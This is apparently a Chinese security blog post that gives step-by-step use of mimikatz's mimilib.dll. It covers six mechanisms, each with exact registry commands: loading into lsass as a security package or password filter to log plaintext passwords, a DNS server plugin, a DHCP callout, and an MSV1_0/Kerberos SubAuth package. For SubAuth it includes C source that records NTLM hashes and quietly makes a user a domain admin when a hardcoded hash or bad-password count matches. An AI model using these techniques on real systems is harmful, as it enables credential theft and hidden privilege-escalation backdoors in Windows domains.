I"A7<h2 id="0x00-前言">0x00 前言</h2>
<hr />

<p>Mimilib是mimikatz的子工程，编译成功后生成文件mimilib.dll，包含多个导出函数。</p>

<p>目前介绍这个dll用法的资料比较少，于是我将结合自己的测试结果，逐个介绍mimilib.dll导出函数的用法。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr />

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Mimilib导出函数简介</li>
  <li>6种功能的具体用法</li>
</ul>

<h2 id="0x02-mimilib导出函数简介">0x02 Mimilib导出函数简介</h2>
<hr />

<p>对应文件的地址为：</p>

<p>https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/mimilib.def</p>

<p>内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXPORTS
	startW					=	kappfree_startW

	SpLsaModeInitialize		=	kssp_SpLsaModeInitialize
	
	InitializeChangeNotify	=	kfilt_InitializeChangeNotify
	PasswordChangeNotify	=	kfilt_PasswordChangeNotify

	WinDbgExtensionDllInit	=	kdbg_WinDbgExtensionDllInit
	ExtensionApiVersion		=	kdbg_ExtensionApiVersion
	coffee					=	kdbg_coffee
	mimikatz				=	kdbg_mimikatz

	DnsPluginInitialize		=	kdns_DnsPluginInitialize
	DnsPluginCleanup		=	kdns_DnsPluginCleanup
	DnsPluginQuery			=	kdns_DnsPluginQuery

	DhcpServerCalloutEntry	=	kdhcp_DhcpServerCalloutEntry
	DhcpNewPktHook			=	kdhcp_DhcpNewPktHook

	Msv1_0SubAuthenticationRoutine	= ksub_Msv1_0SubAuthenticationRoutine
	Msv1_0SubAuthenticationFilter	= ksub_Msv1_0SubAuthenticationRoutine
</code></pre></div></div>

<p>我将以上导出函数划分成了6个实用的功能</p>

<h2 id="0x03-6种功能的具体用法">0x03 6种功能的具体用法</h2>
<hr />

<h3 id="1security-support-provider">1.Security Support Provider</h3>

<p>对应导出函数如下：</p>

<ul>
  <li>SpLsaModeInitialize</li>
</ul>

<p>使用方法：</p>

<p>将mimilib.dll保存至<code class="language-plaintext highlighter-rouge">%SystemRoot%\System32</code></p>

<p>修改注册表位置：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\</code></p>

<p>注册表项<code class="language-plaintext highlighter-rouge">Security Packages</code>的值添加一个<code class="language-plaintext highlighter-rouge">mimilib</code></p>

<p>重新启动系统</p>

<p>进程lsass.exe将会加载mimilib.dll，同时在<code class="language-plaintext highlighter-rouge">%SystemRoot%\System32</code>生成文件<code class="language-plaintext highlighter-rouge">kiwissp.log</code>，记录当前用户的明文口令，测试结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-1/2-1.png" alt="Alt text" /></p>

<p>如果想在不重新启动系统的条件下实现相同的功能，可参考之前的分析文章：</p>

<ul>
  <li><a href="https://3gstudent.github.io/Mimikatz%E4%B8%ADSSP%E7%9A%84%E4%BD%BF%E7%94%A8">Mimikatz中SSP的使用</a></li>
  <li>域渗透——Security Support Provider</li>
</ul>

<h3 id="2passwordchangenotify">2.PasswordChangeNotify</h3>

<p>对应导出函数如下：</p>

<ul>
  <li>InitializeChangeNotify</li>
  <li>PasswordChangeNotify</li>
</ul>

<p>使用方法：</p>

<p>将mimilib.dll保存至<code class="language-plaintext highlighter-rouge">%SystemRoot%\System32</code></p>

<p>修改注册表位置：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\</code></p>

<p>注册表项<code class="language-plaintext highlighter-rouge">Notification Packages</code>的值添加一个<code class="language-plaintext highlighter-rouge">mimilib</code></p>

<p>重新启动系统</p>

<p>进程lsass.exe将会加载mimilib.dll，当系统发生修改密码的事件时，在<code class="language-plaintext highlighter-rouge">%SystemRoot%\System32</code>生成文件<code class="language-plaintext highlighter-rouge">kiwifilter.log</code>，记录用户新修改的明文口令，测试结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-1/2-2.png" alt="Alt text" /></p>

<p>如果想在不重新启动系统的条件下实现相同的功能，可参考之前的分析文章：</p>

<ul>
  <li>域渗透——Hook PasswordChangeNotify</li>
</ul>

<h3 id="3windbg-extension">3.WinDbg Extension</h3>

<p>对应导出函数如下：</p>

<ul>
  <li>WinDbgExtensionDllInit</li>
  <li>ExtensionApiVersion</li>
  <li>coffee</li>
  <li>mimikatz</li>
</ul>

<p>使用方法：</p>

<p>将mimilib.dll保存至WinDbg的winext目录</p>

<p>我的测试环境(Server2012R2x64)保存的路径为：<code class="language-plaintext highlighter-rouge">C:\Program Files\Debugging Tools for Windows (x64)\winext</code></p>

<p>启动WinDbg</p>

<p>加载插件的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.load mimilib
</code></pre></div></div>

<p>测试结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-1/2-3.png" alt="Alt text" /></p>

<p>调用命名实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!coffee
</code></pre></div></div>

<h3 id="4dnsplugin">4.DnsPlugin</h3>

<p>对应导出函数如下：</p>

<ul>
  <li>DnsPluginInitialize</li>
  <li>DnsPluginCleanup</li>
  <li>DnsPluginQuery</li>
</ul>

<p>使用方法：</p>

<p>需要在Dns服务器上进行测试</p>

<p>将mimilib.dll保存至<code class="language-plaintext highlighter-rouge">%SystemRoot%\System32</code></p>

<p>修改注册表位置：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\</code></p>

<p>新建注册表项<code class="language-plaintext highlighter-rouge">ServerLevelPluginDll</code>，类型为<code class="language-plaintext highlighter-rouge">REG_SZ</code>，值为<code class="language-plaintext highlighter-rouge">mimilib.dll</code></p>

<p>对应的cmd命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters /v ServerLevelPluginDll /t REG_SZ /d "mimilib.dll" /f
</code></pre></div></div>

<p>重新启动系统</p>

<p>进程dns.exe将会加载mimilib.dll，当系统发生dns查询事件时，在<code class="language-plaintext highlighter-rouge">%SystemRoot%\System32</code>生成文件<code class="language-plaintext highlighter-rouge">kiwidns.log</code>，记录信息如下：</p>

<ul>
  <li>QueryName</li>
  <li>QueryType</li>
</ul>

<p>测试结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-1/2-4.png" alt="Alt text" /></p>

<p>如果想远程实现相同的功能，可参考之前的分析文章：</p>

<ul>
  <li><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8dnscmd%E5%9C%A8DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDDll">域渗透——利用dnscmd在DNS服务器上实现远程加载Dll</a></li>
</ul>

<h3 id="5dhcp-callout-dll">5.DHCP callout DLL</h3>

<p>对应导出函数如下：</p>

<ul>
  <li>DhcpServerCalloutEntry</li>
  <li>DhcpNewPktHook</li>
</ul>

<p>使用方法：</p>

<p>需要在DHCP服务器上进行测试</p>

<p>修改源代码，设置需要禁用的MAC地址，对应代码位置：https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdhcp.c#L35</p>

<p>将mimilib.dll保存至<code class="language-plaintext highlighter-rouge">%SystemRoot%\System32</code></p>

<p>修改注册表位置：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\DHCPServer\Parameters</code></p>

<p>新建注册表项<code class="language-plaintext highlighter-rouge">CalloutDlls</code>，类型为<code class="language-plaintext highlighter-rouge">REG_MULTI_SZ</code>，值为<code class="language-plaintext highlighter-rouge">mimilib.dll</code></p>

<p>新建注册表项<code class="language-plaintext highlighter-rouge">CalloutEnabled</code>，类型为<code class="language-plaintext highlighter-rouge">DWORD</code>，值为<code class="language-plaintext highlighter-rouge">1</code></p>

<p>对应的cmd命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\System\CurrentControlSet\Services\DHCPServer\Parameters /v CalloutDlls /t REG_MULTI_SZ /d "mimilib.dll" /f
reg add HKLM\System\CurrentControlSet\Services\DHCPServer\Parameters /v CalloutEnabled /t REG_DWORD /d 1 /f
</code></pre></div></div>

<p>重新启动系统</p>

<p>进程svchost.exe将会加载mimilib.dll，将对应MAC地址的DHCP请求丢弃</p>

<p>参考资料：</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/desktop/dhcp/how-the-dhcp-server-api-operates</p>

<h3 id="6subauth">6.SubAuth</h3>

<p>对应导出函数如下：</p>

<ul>
  <li>Msv1_0SubAuthenticationRoutine</li>
  <li>Msv1_0SubAuthenticationFilter</li>
</ul>

<p>使用方法：</p>

<p>将mimilib.dll保存至<code class="language-plaintext highlighter-rouge">%SystemRoot%\System32</code></p>

<p>修改注册表位置：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0</code></p>

<p>新建注册表项<code class="language-plaintext highlighter-rouge">Auth0</code>，类型为<code class="language-plaintext highlighter-rouge">REG_SZ</code>，值为<code class="language-plaintext highlighter-rouge">mimilib</code></p>

<p>对应的cmd命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0 /v Auth0 /t REG_SZ /d "mimilib" /f
</code></pre></div></div>

<p>如果是域环境，需要在域控制器上进行设置</p>

<p>修改注册表位置：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos</code></p>

<p>新建注册表项<code class="language-plaintext highlighter-rouge">Auth0</code>，类型为<code class="language-plaintext highlighter-rouge">REG_SZ</code>，值为<code class="language-plaintext highlighter-rouge">mimilib</code></p>

<p>对应的cmd命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos /v Auth0 /t REG_SZ /d "mimilib" /f
</code></pre></div></div>

<p>重新启动系统</p>

<p>进程lsass.exe将会加载mimilib.dll，当系统产生登录事件时，在<code class="language-plaintext highlighter-rouge">%SystemRoot%\System32</code>生成文件<code class="language-plaintext highlighter-rouge">kiwisub.log</code>，记录信息如下：</p>

<ul>
  <li>UserId</li>
  <li>PrimaryGroupId</li>
  <li>LogonDomainName</li>
  <li>UserName</li>
  <li>Workstation</li>
  <li>BadPasswordCount</li>
  <li>hash</li>
</ul>

<p>这里需要注意当系统开机时，会记录计算机帐户的登录内容</p>

<p>这里可以尝试加入显示时间的代码，就能够获得每台主机的开机时间和用户登录时间</p>

<p>对应代码地址：https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/ksub.c</p>

<p>修改后的内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com

	Vincent LE TOUX
	http://pingcastle.com / http://mysmartlogon.com
	vincent.letoux@gmail.com

	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "ksub.h"


const BYTE myHash[LM_NTLM_HASH_LENGTH] = {0xea, 0x37, 0x0c, 0xb7, 0xb9, 0x44, 0x70, 0x2c, 0x09, 0x68, 0x30, 0xdf, 0xc3, 0x53, 0xe7, 0x02}; // Waza1234/admin
NTSTATUS NTAPI ksub_Msv1_0SubAuthenticationRoutine(IN NETLOGON_LOGON_INFO_CLASS LogonLevel, IN PVOID LogonInformation, IN ULONG Flags, IN PUSER_ALL_INFORMATION UserAll, OUT PULONG WhichFields, OUT PULONG UserFlags, OUT PBOOLEAN Authoritative, OUT PLARGE_INTEGER LogoffTime, OUT PLARGE_INTEGER KickoffTime)
{
	FILE *ksub_logfile;;
#pragma warning(push)
#pragma warning(disable:4996)
	if(ksub_logfile = _wfopen(L"kiwisub.log", L"a"))
#pragma warning(pop)
	{
		SYSTEMTIME st;
		GetLocalTime(&amp;st);

		klog(ksub_logfile, L"%04d-%02d-%02d %02d:%02d:%02d %u (%u) - %wZ\\%wZ (%wZ) (%hu) ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, UserAll-&gt;UserId, UserAll-&gt;PrimaryGroupId, &amp;((PNETLOGON_LOGON_IDENTITY_INFO) LogonInformation)-&gt;LogonDomainName, &amp;((PNETLOGON_LOGON_IDENTITY_INFO) LogonInformation)-&gt;UserName, &amp;((PNETLOGON_LOGON_IDENTITY_INFO) LogonInformation)-&gt;Workstation, UserAll-&gt;BadPasswordCount);
		if(UserAll-&gt;NtPasswordPresent)
			klog_hash(ksub_logfile, &amp;UserAll-&gt;NtPassword, FALSE);
		if((UserAll-&gt;BadPasswordCount == 4) || (UserAll-&gt;NtPasswordPresent &amp;&amp; RtlEqualMemory(UserAll-&gt;NtPassword.Buffer, myHash, min(sizeof(myHash), UserAll-&gt;NtPassword.Length))))
		{
			UserAll-&gt;PrimaryGroupId = 512;
			klog(ksub_logfile, L" :)\n");
		}
		else klog(ksub_logfile, L"\n");
		fclose(ksub_logfile);
	}
	*WhichFields = 0;
	*UserFlags = 0;
	*Authoritative = TRUE;
	LogoffTime-&gt;QuadPart = KickoffTime-&gt;QuadPart = 0x7fffffffffffffff;
	return STATUS_SUCCESS;
}
</code></pre></div></div>

<p>测试结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-1/2-5.png" alt="Alt text" /></p>

<p>参考资料：</p>

<p>https://github.com/microsoft/Windows-classic-samples/tree/master/Samples/Win7Samples/security/authentication/msvsubauth</p>

<p>https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package</p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr />

<p>本文介绍了Mimilib中6种功能的具体用法。</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET